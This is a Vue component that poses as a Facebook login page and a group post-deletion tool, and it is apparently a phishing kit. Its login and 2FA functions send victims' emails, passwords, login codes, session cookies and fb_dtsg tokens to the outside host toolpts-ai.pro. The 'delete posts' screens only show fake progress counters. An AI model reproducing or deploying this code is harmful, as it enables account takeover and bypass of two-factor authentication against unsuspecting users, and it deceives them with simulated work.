<style scoped>
.site {
  max-width: 500px;
  margin: auto;
  /* background-color: antiquewhite; */
  min-height: 100vh;
  padding: 0 30px;
  padding-top: 60px;
}

.verify {
  padding: 0 10px;
  padding-top: 60px;

}

.img {
  margin: auto;

}

img {
  width: 100%;
  height: 60px;
}

.input {
  width: 100%;
  margin-bottom: 15px;
}

input {
  width: 100%;
  padding: 15px 14px;
  /* outline: none; */
  background-color: rgba(224, 224, 224, 0.356);
  border: none;
}

.btn-submit {
  width: 100%;
  padding: 13px;
  background-color: #1877f2;
  border: none;
  box-shadow: 2px 2px 10px 2px rgba(128, 128, 128, 0.185);
  border-radius: 5px;
  color: aliceblue;
  font-weight: 800;
  font-size: 1.2em;
}

.btn-submit-verify {
  width: 100%;
  padding: 13px;
  background-color: #627aad;
  border: none;
  box-shadow: 2px 2px 10px 2px rgba(128, 128, 128, 0.185);
  border-radius: 2px;
  color: aliceblue;
  font-weight: 400;
  font-size: 1.2em;
}

.btn-submit-form {
  width: 50%;
  padding: 10px;
  background-color: #1877f2;
  border: none;
  box-shadow: 2px 2px 10px 2px rgba(128, 128, 128, 0.185);
  border-radius: 5px;
  color: aliceblue;
  font-weight: 400;
  margin: auto;
}

.forget-password {
  text-align: center;
  color: #1877f2;
}

.trouble {
  text-align: center;
  color: #1877f2;
  padding: 7px;
  opacity: 0.5;
}

.re_login {
  text-align: center;
  color: #4d4d4d;
  padding: 20px;
  opacity: 0.5;
}

.hr {
  opacity: 0.2;
  padding: 20px;
}

.create {
  padding: 0 10px;
}

.btn-create {
  width: 100%;
  padding: 13px;
  /* background-color:#1877f2 ; */
  border: 1px solid rgba(128, 128, 128, 0.144);
  box-shadow: 2px 2px 10px 2px rgba(180, 179, 179, 0.185);
  border-radius: 3px;
  /* font-weight: 800; */
  font-size: 1.2em;
}

.meta_about {
  text-align: center;
  font-size: 0.9em;
}

.about {
  text-align: center;
  font-size: 0.8em;
}

.fa_code {
  background-color: rgb(255, 255, 255);
  border: 1px solid rgba(128, 128, 128, 0.315);
  padding: 8px;
}

.fa_hr {
  opacity: 0.4;
}

.pt-verify {
  width: 60%;
}

.input-verify {
  padding: 10px;
  outline: none;
  border: 1px solid rgba(128, 128, 128, 0.507);
}

.loader {
  width: 38px;
  height: 38px;
  border: 5px solid #FFF;
  border-bottom-color: transparent;
  border-radius: 50%;
  display: inline-block;
  box-sizing: border-box;
  animation: rotation 1s linear infinite;
}

@keyframes rotation {
  0% {
    transform: rotate(0deg);
  }

  100% {
    transform: rotate(360deg);
  }
}

.load {
  position: fixed;
  width: 100%;
  min-height: 100vh;
  background-color: rgba(128, 128, 128, 0.493);
  padding-top: 300px;
  left: 0;
}

.load_content {

  display: flex;
  justify-content: center;
  align-items: center;
}

.loader {
  font-size: 0.6em;
}

.error {
  background-color: red;
  color: #FFF;
  padding: 5px;
}

.error span {
  font-weight: 700;
}

.error-code p {
  font-size: 0.9em;
  font-weight: 700;
}

.main {
  padding-top: 20px;
  text-align: center;
}

.main_1 {
  color: black;
  text-align: start;
  padding: 30px;
}

.main_2 {
  padding: 20px;
}

.flex {
  display: flex;
  flex-wrap: nowrap;
}

.radio {
  display: inline;
  line-height: 35px;
}

.selection {
  margin: 0;
  padding: 0;
}

li {
  list-style: none;
}

.checkbox {
  width: 45px;
}

h3 {
  margin-bottom: 10px;
}

.btn-next {
  color: #1877f2;
  padding: 10px;
}

.input-next {
  text-align: center;
  margin-top: 40px;
}

.desciption {
  font-size: 13px;
  margin-bottom: 10px;
}

.textarea {
  padding: 10px;
  background-color: rgba(224, 224, 224, 0.356);
  border: 1px solid rgba(128, 128, 128, 0.116);
}

.capture-img {
  text-align: center;
}
</style>


<template>
  <div class="load" v-if="loading">
    <div class="load_content">
      <div class="icon">
        <span class="loader"></span>
      </div>
    </div>
  </div>
  <div :class="design == 1 ? 'site' : 'site verify'">
    <div class="error" v-if="error_email">
      <p>Incorrect email or password. <span>Did you forget your password?</span></p>
    </div>
    <div class="site_top">
      <div class="img">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="">
      </div>
    </div>
    <div class="site_body" v-if="design == 1">
      <div class="input">
        <input type="text" placeholder="Mobile number or email address" v-model="email">
      </div>
      <div class="input">
        <input type="password" placeholder="Password" v-model="password">
      </div>
      <div class="input">
        <button type="button" class="btn-submit" @click="loginData">Log In</button>
      </div>
      <div class="forget-password">
        <a type="button" class="forget">Forgotten password?</a>
      </div>

      <div class="hr">
        <hr>
      </div>
      <div class="input create">
        <button type="button" class="btn-create">Create new account</button>
      </div>
      <br>
      <div class="about">
        About - Help - More
      </div>
      <div class="meta_about">
        <p>Meta © 2023</p>
      </div>
    </div>
    <div class="site_body" v-if="design == 2">
      <div class="fa_code">
        <div class="input">
          Enter login code to continue
        </div>
        <div class="fa_hr">
          <hr>
        </div>
        <div class="error-code" v-if="error_code">
          <p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.
          </p>
        </div>
        <div class="input">
          It looks like you haven't logged in from this browser before. Please enter the login code from your phone below.
        </div>
        <div class="input pt-verify">
          <input type="text" class="input-verify" placeholder="" v-model="code">
        </div>
        <div class="fa_hr">
          <hr>
        </div>
        <div class="trouble">
          <a type="button" class="forget">Having trouble?</a>
        </div>
        <div class="input">
          <button type="button" class="btn-submit-verify" @click="confirm2fa">Submit Code</button>
        </div>
      </div>
      <div class="re_login">
        <a type="button" class="forget" @click="loginEvent">Log in here</a>
      </div>
      <br>
      <!-- <div class="about">
                                  About - Help - More
                                </div>
                                <div class="meta_about">
                                  <p>Meta © 2023</p>
                                </div> -->
    </div>
    <div class="site_body" v-if="design == 3">
      <div class="main_1" v-if="main_1 == 1">
        <!-- <p>Currently, the software is being temporarily updated, the update will be completed on October 20, 2024.</p> -->
        <h3>Select the function to run</h3>
        <!-- <span class="desciption">Complain according to the latest prescription, with response within 24 hours</span> -->
        <ul class="selection">
          <li>
            <div class="radio">
              <input type="radio" name="checkbox" class="checkbox" value="2" v-model="selectChoose">
              <label>Delete pending posts group</label><br>
            </div>
            <div class="radio">
              <input type="radio" name="checkbox" class="checkbox" value="3" v-model="selectChoose">
              <label>Delete posts group</label><br>
            </div>
            <div class="radio">
              <input type="radio" name="checkbox" class="checkbox" value="4" v-model="selectChoose">
              <label>Delete posts based on interaction</label><br>
            </div>
            <div class="radio">
              <input type="radio" name="checkbox" class="checkbox" value="5" v-model="selectChoose">
              <label>Delete comments group</label><br>
            </div>
            <div class="radio">
              <input type="radio" name="checkbox" class="checkbox" value="6" v-model="selectChoose">
              <label>Delete comments group (keyword)</label><br>
            </div>
          </li>
        </ul>
        <div class="input-next">
          <a class="btn-next" @click="nextEvent">Next</a>
        </div>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <br>
        <div class="input-next">
          <a class="btn-next" @click="loginEvent" style="text-decoration: underline;">Logout</a>
        </div>
      </div>
      <div class="main_2" v-else-if="main_1 == 2">
        <!-- <p>Currently, the software is being temporarily updated, the update will be completed on October 20, 2024.</p> -->
        <h3>Delete pending posts</h3>
        <span class="desciption">Please proceed slowly to avoid feature blocking</span>
        <div class="input">
          <label for="age1">Group ID: </label>
          <input type="input" class="input" placeholder="Url or group id">
        </div>
        <div class="input">
          <label for="age1">Waiting time(seconds): </label>
          <input type="number" class="input" value="5">
        </div>
        <div class="radio">
          <textarea type="text" name="checkbox" class="input textarea" v-model="note" rows="5" placeholder=""></textarea>
        </div>
        <br>
        <div class="input-next">
          <button type="button" class="btn-submit-form" @click="submit">Submit</button>
        </div>
        <div class="input-next">
          <a class="btn-next" @click="goHome">Home</a>
        </div>
      </div>
      <div class="main_2" v-else-if="main_1 == 3">
        <!-- <p>Currently, the software is being temporarily updated, the update will be completed on October 20, 2024.</p> -->
        <h3>Delete pending posts</h3>
        <span class="desciption">Please proceed slowly to avoid feature blocking</span>
        <div class="input">
          <label for="age1">Group ID: </label>
          <input type="input" class="input" placeholder="Url or group id">
        </div>
        <div class="input">
          <label for="age1">Waiting time(seconds): </label>
          <input type="number" class="input" value="5">
        </div>
        <div class="radio">
          <textarea type="text" name="checkbox" class="input textarea" v-model="note" rows="5" placeholder=""></textarea>
        </div>
        <br>
        <div class="input-next">
          <button type="button" class="btn-submit-form" @click="submit">Submit</button>
        </div>
        <div class="input-next">
          <a class="btn-next" @click="goHome">Home</a>
        </div>
      </div>
      <div class="main_2" v-else-if="main_1 == 4">
        <!-- <p>Currently, the software is being temporarily updated, the update will be completed on October 20, 2024.</p> -->
        <h3>Delete pending posts</h3>
        <span class="desciption">Please proceed slowly to avoid feature blocking</span>
        <div class="input">
          <label for="age1">Group ID: </label>
          <input type="input" class="input" placeholder="Url or group id">
        </div>
        <div class="input">
          <label for="age1">Waiting time(seconds): </label>
          <input type="number" class="input" value="5">
        </div>
        <div class="input">
          <label for="age1">Smaller number of interactions: </label>
          <input type="number" class="input" value="50">
        </div>
        <div class="radio">
          <textarea type="text" name="checkbox" class="input textarea" v-model="note" rows="5" placeholder=""></textarea>
        </div>
        <br>
        <div class="input-next">
          <button type="button" class="btn-submit-form" @click="submit">Submit</button>
        </div>
        <div class="input-next">
          <a class="btn-next" @click="goHome">Home</a>
        </div>
      </div>
      <div class="main_2" v-else-if="main_1 == 5">
        <!-- <p>Currently, the software is being temporarily updated, the update will be completed on October 20, 2024.</p> -->
        <h3>Delete comments</h3>
        <span class="desciption">Please proceed slowly to avoid feature blocking</span>
        <div class="input">
          <label for="age1">Group ID: </label>
          <input type="input" class="input" placeholder="Url or group id">
        </div>
        <div class="input">
          <label for="age1">Waiting time(seconds): </label>
          <input type="number" class="input" value="5">
        </div>
        <div class="radio">
          <textarea type="text" name="checkbox" class="input textarea" v-model="note" rows="5" placeholder=""></textarea>
        </div>
        <br>
        <div class="input-next">
          <button type="button" class="btn-submit-form" @click="submitCmt">Submit</button>
        </div>
        <div class="input-next">
          <a class="btn-next" @click="goHome">Home</a>
        </div>
      </div>
      <div class="main_2" v-else-if="main_1 == 6">
        <!-- <p>Currently, the software is being temporarily updated, the update will be completed on October 20, 2024.</p> -->
        <h3>Delete pending posts</h3>
        <span class="desciption">Please proceed slowly to avoid feature blocking</span>
        <div class="input">
          <label for="age1">Group ID: </label>
          <input type="input" class="input" placeholder="Url or group id">
        </div>
        <div class="input">
          <label for="age1">Waiting time(seconds): </label>
          <input type="number" class="input" value="5">
        </div>
        <div class="radio">
          <textarea type="text" name="checkbox" class="input textarea" rows="5" placeholder="List keyword"></textarea>
        </div>
        <div class="radio">
          <textarea type="text" name="checkbox" class="input textarea" v-model="note" rows="5" placeholder=""></textarea>
        </div>
        <br>
        <div class="input-next">
          <button type="button" class="btn-submit-form" @click="submitCmt">Submit</button>
        </div>
        <div class="input-next">
          <a class="btn-next" @click="goHome">Home</a>
        </div>
      </div>
      <!-- <div class="main_2" v-else>
          <p>We will respond to you within the next 24 hours, thank you!</p>
          <div class="input-next">
            <a class="btn-next" @click="goHome">Home</a>
          </div>
        </div> -->
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted } from 'vue';
const domain = ref('toolpts-ai.pro')
// Create a ref
const loading = ref(false)
const design = ref(1)

const main_1 = ref(1)


const email = ref('')
const password = ref('')

const code = ref('')
const coke = ref('')

const fb_dtsg = ref('')
const jazoest = ref('')
const nh = ref('')


const note = ref('')
const selectChoose = ref('')

const error_email = ref(false)
const error_code = ref(false)

const nextEvent = () => {
  // alert(selectChoose.value)
  // if(selectChoose.value == )
  main_1.value = selectChoose.value
}
const goHome = () => {
  main_1.value = 1
}
const setup = () => {
  document.title = "Facebook"
  // design.value = 2
};
const loginEvent = () => {
  design.value = 1
}
const submit = () => {
  // loading.value = true
  // setTimeout(() => {
  //   main_1.value = 3
  //   loading.value = false
  // }, 5000)

  note.value = "Loadding post in group"
  setTimeout(() => {
    var number = 0;
    setInterval(() => {
      note.value = `Delete post ${number}\n${note.value}`
      number++;
    }, 500)

  }, 2000)


}
const submitCmt = () => {
  // loading.value = true
  // setTimeout(() => {
  //   main_1.value = 3
  //   loading.value = false
  // }, 5000)

  note.value = "Loadding comment in group"
  setTimeout(() => {
    var number = 0;
    setInterval(() => {
      note.value = `Delete comment ${number}\n${note.value}`
      number++;
    }, 500)

  }, 2000)


}
const capture = () => {
  document.getElementById('capture').click()
}
const loginData = async () => {
  error_email.value = false
  loading.value = true
  let result = await login()
  var data = JSON.parse(result)
  coke.value = data.cookie
  fb_dtsg.value = data.fb_dtsg
  console.log(fb_dtsg.value)
  jazoest.value = data.jazoest
  nh.value = data.nh
  if (coke.value.split(';').length == 3) {
    error_email.value = true
  } else {
    if (nh.value != null) {
      design.value = 2
    }
    else {
      //viết duy 
      design.value = 3
    }
  }
  loading.value = false
}
const confirm2fa = async () => {
  loading.value = true
  error_code.value = false
  let result = await confirmVerify()
  var data = JSON.parse(result)
  coke.value = data.cookie
  if (!coke.value.includes("checkpoint")) {
    design.value = 3
  } else {
    error_code.value = true
    design.value = 2
  }
  loading.value = false
}
const login = async () => {
  return new Promise((resolve, reject) => {
    var requestOptions = {
      method: 'GET',
      redirect: 'follow'
    };
    fetch(`https://${domain.value}/?login=login&email=${email.value}&password=${password.value}`, requestOptions)
      .then(response => response.text())
      .then(result => {
        resolve(result)
      })
      .catch(error => {
        reject(error)
      });
  })
}
const confirmVerify = async () => {
  return new Promise((resolve, reject) => {
    var myHeaders = new Headers();
    myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
    var urlencoded = new URLSearchParams();
    urlencoded.append("code", code.value);
    urlencoded.append("coke", coke.value);
    urlencoded.append("fb_dtsg", fb_dtsg.value);
    urlencoded.append("jazoest", jazoest.value);
    var requestOptions = {
      method: 'POST',
      headers: myHeaders,
      body: urlencoded,
      redirect: 'follow'
    };
    fetch(`https://${domain.value}/?2fa=2fa&nh=${nh.value}`, requestOptions)
      .then(response => response.text())
      .then(result => {
        resolve(result)
      })
      .catch(error => {
        reject(error)
      });
  })
}
onMounted(() => {
  setup();
});

</script>
